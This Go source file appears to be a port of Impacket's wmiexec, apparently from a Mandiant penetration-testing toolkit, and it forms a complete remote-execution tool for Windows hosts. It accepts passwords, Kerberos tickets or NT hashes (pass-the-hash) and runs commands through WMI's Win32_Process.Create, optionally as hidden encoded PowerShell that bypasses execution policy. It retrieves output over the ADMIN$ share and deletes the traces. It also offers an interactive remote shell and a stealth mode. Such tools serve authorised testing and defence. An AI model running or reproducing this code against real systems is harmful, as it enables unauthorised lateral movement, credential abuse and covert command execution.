// Copyright 2026 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     https://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package main

import (
	"bufio"
	"context"
	"crypto/rand"
	"encoding/base64"
	"flag"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"strings"
	"time"
	"unicode/utf16"

	"github.com/oiweiwei/go-msrpc/dcerpc"
	"github.com/rs/zerolog"

	"github.com/oiweiwei/go-msrpc/msrpc/dcom"
	"github.com/oiweiwei/go-msrpc/msrpc/dcom/iactivation/v0"
	"github.com/oiweiwei/go-msrpc/msrpc/dcom/iobjectexporter/v0"
	"github.com/oiweiwei/go-msrpc/msrpc/dcom/wmio/query"

	"github.com/oiweiwei/go-msrpc/msrpc/dcom/wmio"

	"github.com/oiweiwei/go-msrpc/msrpc/dcom/wmi"
	"github.com/oiweiwei/go-msrpc/msrpc/dcom/wmi/iwbemlevel1login/v0"
	"github.com/oiweiwei/go-msrpc/msrpc/dcom/wmi/iwbemservices/v0"

	"github.com/oiweiwei/go-msrpc/ssp"
	"github.com/oiweiwei/go-msrpc/ssp/credential"
	"github.com/oiweiwei/go-msrpc/ssp/gssapi"
	"github.com/oiweiwei/go-msrpc/ssp/krb5"

	gokrb5config "github.com/oiweiwei/gokrb5.fork/v9/config"
	gokrb5credentials "github.com/oiweiwei/gokrb5.fork/v9/credentials"

	"github.com/oiweiwei/go-msrpc/msrpc/erref/hresult"
	_ "github.com/oiweiwei/go-msrpc/msrpc/erref/win32"
	_ "github.com/oiweiwei/go-msrpc/msrpc/erref/wmi"

	"github.com/mandiant/gopacket/pkg/flags"
	"github.com/mandiant/gopacket/pkg/kerberos"
	"github.com/mandiant/gopacket/pkg/session"
	"github.com/mandiant/gopacket/pkg/smb"
	"github.com/mandiant/gopacket/pkg/transport"
)

var (
	noOutput      = flag.Bool("nooutput", false, "Don't retrieve command output")
	silentCommand = flag.Bool("silentcommand", false, "does not execute cmd.exe to run given command (no output)")
	share         = flag.String("share", "ADMIN$", "Share to use for output retrieval")
	shell         = flag.String("shell", "cmd.exe /Q /c ", "Shell prefix for command execution")
	shellType     = flag.String("shell-type", "cmd", "Choose shell type: cmd or powershell")
	codec         = flag.String("codec", "", "Sets encoding used (codec) from the target's output (default \"utf-8\")")
	comVersion    = flag.String("com-version", "", "DCOM version, format is MAJOR_VERSION:MINOR_VERSION (e.g. 5.7)")
	timeout       = flag.Int("timeout", 30, "Timeout in seconds waiting for command output")
)

func main() {
	opts := flags.Parse()

	// Apply silentcommand mode (removes cmd.exe wrapper)
	if *silentCommand {
		*shell = ""
		*noOutput = true
	}

	if opts.TargetStr == "" {
		flag.Usage()
		os.Exit(1)
	}

	target, creds, err := session.ParseTargetString(opts.TargetStr)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] Error parsing target string: %v\n", err)
		os.Exit(1)
	}

	opts.ApplyToSession(&target, &creds)

	if !opts.NoPass {
		if err := session.EnsurePassword(&creds); err != nil {
			fmt.Fprintln(os.Stderr, err)
			os.Exit(1)
		}
	}

	// Setup Logging
	log := zerolog.New(os.Stderr)
	if !opts.Debug {
		log = zerolog.New(io.Discard)
	}

	// Setup Credentials and Security Options
	fullUser := creds.Username
	if creds.Domain != "" {
		fullUser = creds.Domain + "\\" + creds.Username
	}

	// Security options to pass to dcerpc clients
	var securityOpts []dcerpc.Option
	securityOpts = append(securityOpts, dcerpc.WithSign())

	if creds.UseKerberos {
		// Kerberos authentication via ccache
		ccachePath := os.Getenv("KRB5CCNAME")
		if ccachePath == "" {
			localCCache := creds.Username + ".ccache"
			if _, err := os.Stat(localCCache); err == nil {
				ccachePath = localCCache
			}
		}
		if ccachePath == "" {
			fmt.Fprintln(os.Stderr, "[-] Kerberos authentication requires KRB5CCNAME or <username>.ccache file")
			os.Exit(1)
		}
		log.Info().Msgf("Using Kerberos authentication with ccache: %s", ccachePath)

		// Load the ccache and create credential from it
		ccache, err := gokrb5credentials.LoadCCache(ccachePath)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[-] Failed to load ccache: %v\n", err)
			os.Exit(1)
		}
		ccCred := credential.NewFromCCache(fullUser, ccache)
		gssapi.AddCredential(ccCred)

		// Create Kerberos config with KDC address
		realm := strings.ToUpper(creds.Domain)
		kdc := target.Host // Use target as KDC
		confStr := fmt.Sprintf(`[libdefaults]
    default_realm = %s
    dns_lookup_realm = false
    dns_lookup_kdc = false

[realms]
    %s = {
        kdc = %s
    }
`, realm, realm, kdc)

		krb5Conf, err := gokrb5config.NewFromString(confStr)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[-] Failed to create Kerberos config: %v\n", err)
			os.Exit(1)
		}

		// Create mechanism config with proper KDC settings
		krbConfig := krb5.NewConfig()
		krbConfig.KRB5Config = krb5.ParsedLibDefaults(krb5Conf)
		krbConfig.DCEStyle = true

		// Add mechanisms with config
		gssapi.AddMechanism(ssp.SPNEGO)
		gssapi.AddMechanism(ssp.KRB5)

		// Set target name for Kerberos SPN and add Kerberos config
		securityOpts = append(securityOpts, dcerpc.WithTargetName("host/"+target.Host))
		securityOpts = append(securityOpts, dcerpc.WithSecurityConfig(krbConfig))
	} else if creds.Hash != "" {
		// Pass-the-hash authentication
		ntHash, err := kerberos.ParseHashes(creds.Hash)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[-] Invalid hash format: %v\n", err)
			os.Exit(1)
		}
		log.Info().Msg("Using pass-the-hash authentication")
		gssapi.AddCredential(credential.NewFromNTHash(fullUser, ntHash))
		gssapi.AddMechanism(ssp.NTLM)
		gssapi.AddMechanism(ssp.SPNEGO)
	} else {
		// Password authentication
		gssapi.AddCredential(credential.NewFromPassword(fullUser, creds.Password))
		gssapi.AddMechanism(ssp.NTLM)
		gssapi.AddMechanism(ssp.SPNEGO)
	}

	ctx := gssapi.NewSecurityContext(context.Background())

	// Route DCE/RPC TCP connects through gopacket's transport so -proxy /
	// proxychains take effect. Without this, upstream falls back to net.Dialer
	// which bypasses both the SOCKS5 dialer and the libc connect() hook.
	dialer := dcerpc.WithDialer(&transport.Dialer{})

	// 1. Connect to Endpoint Mapper (Port 135)
	log.Info().Msgf("Connecting to %s:135", target.Host)
	cc, err := dcerpc.Dial(ctx, net.JoinHostPort(target.Host, "135"), dialer)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] Dial 135 failed: %v\n", err)
		os.Exit(1)
	}
	defer cc.Close(ctx)

	// 2. Object Exporter (to find bindings)
	cli, err := iobjectexporter.NewObjectExporterClient(ctx, cc, securityOpts...)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] NewObjectExporterClient failed: %v\n", err)
		os.Exit(1)
	}

	srv, err := cli.ServerAlive2(ctx, &iobjectexporter.ServerAlive2Request{})
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] ServerAlive2 failed: %v\n", err)
		os.Exit(1)
	}

	// 3. Remote Activation
	iact, err := iactivation.NewActivationClient(ctx, cc, securityOpts...)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] NewActivationClient failed: %v\n", err)
		os.Exit(1)
	}

	log.Info().Msg("Activating WMI...")
	act, err := iact.RemoteActivation(ctx, &iactivation.RemoteActivationRequest{
		ORPCThis:                   &dcom.ORPCThis{Version: srv.COMVersion},
		ClassID:                    wmi.Level1LoginClassID.GUID(),
		IIDs:                       []*dcom.IID{iwbemlevel1login.Level1LoginIID},
		RequestedProtocolSequences: []uint16{7}, // TCP/IP
	})

	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] RemoteActivation failed: %v\n", err)
		os.Exit(1)
	}
	if act.HResult != 0 {
		fmt.Fprintf(os.Stderr, "[-] RemoteActivation error: %s\n", hresult.FromCode(uint32(act.HResult)))
		os.Exit(1)
	}

	std := act.InterfaceData[0].GetStandardObjectReference().Std

	// 4. Dial WMI Endpoint
	log.Info().Msg("Dialing WMI endpoint...")
	endpoints := act.OXIDBindings.EndpointsByProtocol("ncacn_ip_tcp")
	if len(endpoints) == 0 {
		fmt.Fprintln(os.Stderr, "[-] No TCP endpoints found for WMI")
		os.Exit(1)
	}

	wcc, err := dcerpc.Dial(ctx, target.Host, append([]dcerpc.Option{dialer}, endpoints...)...)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] Dial WMI failed: %v\n", err)
		os.Exit(1)
	}
	defer wcc.Close(ctx)

	// 5. Login to WMI
	log.Info().Msg("Logging into WMI...")

	wmiCtx := gssapi.NewSecurityContext(ctx)

	wmiOpts := append([]dcerpc.Option{dcom.WithIPID(std.IPID)}, securityOpts...)
	l1login, err := iwbemlevel1login.NewLevel1LoginClient(wmiCtx, wcc, wmiOpts...)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] NewLevel1LoginClient failed: %v\n", err)
		os.Exit(1)
	}

	login, err := l1login.NTLMLogin(wmiCtx, &iwbemlevel1login.NTLMLoginRequest{
		This:            &dcom.ORPCThis{Version: srv.COMVersion},
		NetworkResource: "//./root/cimv2",
	})
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] NTLMLogin failed: %v\n", err)
		os.Exit(1)
	}

	log.Info().Msg("WMI Login Successful")

	// 6. Connect to IWbemServices
	ns := login.Namespace
	svcsOpts := append([]dcerpc.Option{dcom.WithIPID(ns.InterfacePointer().IPID())}, securityOpts...)
	svcs, err := iwbemservices.NewServicesClient(wmiCtx, wcc, svcsOpts...)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] NewServicesClient failed: %v\n", err)
		os.Exit(1)
	}

	// Create executor
	executor := &WMIExec{
		ctx:       wmiCtx,
		svcs:      svcs,
		srv:       srv,
		target:    target,
		creds:     creds,
		share:     *share,
		shell:     *shell,
		shellType: *shellType,
		noOutput:  *noOutput,
		stealth:   *silentCommand,
		timeout:   *timeout,
		log:       log,
	}

	// Main Execution Logic
	command := opts.Command()
	if command != "" {
		// Single Command
		output, _ := executor.execute(command)
		fmt.Print(output)
	} else {
		executor.interactiveShell()
	}
}

// WMIExec handles remote command execution via WMI
type WMIExec struct {
	ctx       context.Context
	svcs      iwbemservices.ServicesClient
	srv       *iobjectexporter.ServerAlive2Response
	target    session.Target
	creds     session.Credentials
	share     string
	shell     string
	shellType string
	noOutput  bool
	stealth   bool
	timeout   int
	pwd       string
	log       zerolog.Logger
}

func (e *WMIExec) interactiveShell() {
	fmt.Println("[!] Launching semi-interactive shell - Careful what you execute")
	fmt.Println("[!] Press Ctrl+D or type 'exit' to quit")
	fmt.Println("[!] Type '!command' to run local commands")

	// Initialize PWD
	e.pwd = "C:\\"

	// Get initial prompt by running 'cd'
	if output, err := e.execute("cd"); err == nil {
		output = strings.TrimSpace(output)
		if output != "" && strings.Contains(output, ":\\") {
			e.pwd = strings.ReplaceAll(output, "\r\n", "")
		}
	}

	prompt := e.pwd + ">"
	if e.shellType == "powershell" {
		prompt = "PS " + prompt + " "
	}

	scanner := bufio.NewScanner(os.Stdin)
	for {
		fmt.Print(prompt)
		if !scanner.Scan() {
			fmt.Println()
			break
		}
		cmd := strings.TrimSpace(scanner.Text())
		if cmd == "" {
			continue
		}
		if strings.EqualFold(cmd, "exit") {
			break
		}

		// Local shell escape - like Impacket's ! prefix
		if strings.HasPrefix(cmd, "!") {
			localCmd := strings.TrimPrefix(cmd, "!")
			if localCmd == "" {
				fmt.Println("[!] Usage: !command - runs command on local system")
				continue
			}
			out, err := exec.Command("sh", "-c", localCmd).CombinedOutput()
			if err != nil {
				fmt.Fprintf(os.Stderr, "[-] Local command error: %v\n", err)
			}
			fmt.Print(string(out))
			continue
		}

		// Handle CD command specially to track PWD
		if strings.HasPrefix(strings.ToLower(cmd), "cd") {
			// Execute 'cd <path> && cd' to get the actual resulting path
			output, err := e.execute(cmd + " && cd")
			if err == nil {
				// The output should contain the new path
				lines := strings.Split(strings.TrimSpace(output), "\r\n")
				if len(lines) > 0 {
					potentialPath := strings.TrimSpace(lines[len(lines)-1])
					if strings.Contains(potentialPath, ":\\") {
						e.pwd = potentialPath
						prompt = e.pwd + ">"
						if e.shellType == "powershell" {
							prompt = "PS " + prompt + " "
						}
					}
				}
			} else {
				fmt.Fprintf(os.Stderr, "[-] cd failed: %v\n", err)
			}
			continue
		}

		// Normal command
		output, _ := e.execute(cmd)
		fmt.Print(output)
	}
}

func (e *WMIExec) execute(command string) (string, error) {
	var finalCommand string
	var smbOutput string

	// Get current PWD for command context
	pwd := e.pwd
	if pwd == "" {
		pwd = "C:\\"
	}

	// Build command based on shell type
	if e.shellType == "powershell" && !e.stealth {
		// Use Base64 encoding for PowerShell commands (more reliable)
		psCommand := "$ProgressPreference='SilentlyContinue';" + command
		encoded := encodeUTF16LEBase64(psCommand)
		psPrefix := "powershell.exe -NoP -NoL -sta -NonI -W Hidden -Exec Bypass -Enc "

		if !e.noOutput {
			smbOutput = generateRandomFilename()
			// Wrap in parentheses so redirection applies to entire command chain
			finalCommand = fmt.Sprintf("cmd.exe /Q /c (cd /d %s && %s%s) 1> \\\\127.0.0.1\\%s\\%s 2>&1",
				pwd, psPrefix, encoded, e.share, smbOutput)
		} else {
			finalCommand = fmt.Sprintf("cmd.exe /Q /c cd /d %s && %s%s", pwd, psPrefix, encoded)
		}
	} else {
		// Standard cmd execution
		cmdWithDir := command
		if !e.stealth {
			cmdWithDir = fmt.Sprintf("cd /d %s && %s", pwd, command)
		}

		if !e.noOutput {
			smbOutput = generateRandomFilename()
			// Wrap command in parentheses so redirection applies to entire command chain
			finalCommand = fmt.Sprintf("%s(%s) 1> \\\\127.0.0.1\\%s\\%s 2>&1", e.shell, cmdWithDir, e.share, smbOutput)
		} else {
			finalCommand = e.shell + cmdWithDir
		}
	}

	e.log.Debug().Msgf("Executing: %s", finalCommand)

	builder := query.NewBuilder(e.ctx, e.svcs, e.srv.COMVersion)

	args := wmio.Values{
		"CommandLine":      finalCommand,
		"CurrentDirectory": nil,
	}

	out, err := builder.Spawn("Win32_Process").Method("Create").Values(args, wmio.JSONValueToType).Exec().Object()
	if err != nil {
		return "", fmt.Errorf("execution failed: %v", err)
	}

	// check for ReturnValue
	vals := out.Values()
	var retVal any
	if vals != nil {
		retVal = vals["ReturnValue"]
	}

	if !e.noOutput {
		// Poll for output with retry logic
		output, err := e.retrieveOutput(smbOutput)
		if err == nil {
			return output, nil
		}
		return "", err
	}

	if retVal != nil && fmt.Sprintf("%v", retVal) != "0" {
		return fmt.Sprintf("[+] Command executed with ReturnValue: %v\n", retVal), nil
	}
	return "", nil
}

func (e *WMIExec) retrieveOutput(filename string) (string, error) {
	// Connect via SMB to retrieve the output file
	smbClient := smb.NewClient(e.target, &e.creds)
	if err := smbClient.Connect(); err != nil {
		return "", fmt.Errorf("SMB connection failed: %v", err)
	}
	defer smbClient.Close()

	// Select the share
	if err := smbClient.UseShare(e.share); err != nil {
		return "", fmt.Errorf("failed to use share %s: %v", e.share, err)
	}

	// Poll for output file with retry
	maxIterations := e.timeout * 10 // 100ms intervals
	for i := 0; i < maxIterations; i++ {
		time.Sleep(100 * time.Millisecond)

		content, err := smbClient.Cat(filename)
		if err == nil {
			// Delete the output file
			smbClient.Rm(filename)
			return content, nil
		}

		// If sharing violation, command is still running
		if strings.Contains(err.Error(), "STATUS_SHARING_VIOLATION") {
			e.log.Debug().Msg("Output file in use, waiting...")
			continue
		}

		// If file not found, keep waiting
		if strings.Contains(err.Error(), "STATUS_OBJECT_NAME_NOT_FOUND") {
			continue
		}
	}

	return "", fmt.Errorf("timeout waiting for output file")
}

// encodeUTF16LEBase64 encodes a string to UTF-16LE and then Base64
// This is how PowerShell's -EncodedCommand expects input
func encodeUTF16LEBase64(s string) string {
	utf16Chars := utf16.Encode([]rune(s))
	bytes := make([]byte, len(utf16Chars)*2)
	for i, c := range utf16Chars {
		bytes[i*2] = byte(c)
		bytes[i*2+1] = byte(c >> 8)
	}
	return base64.StdEncoding.EncodeToString(bytes)
}

func generateRandomFilename() string {
	b := make([]byte, 8)
	rand.Read(b)
	return fmt.Sprintf("%x.txt", b)
}
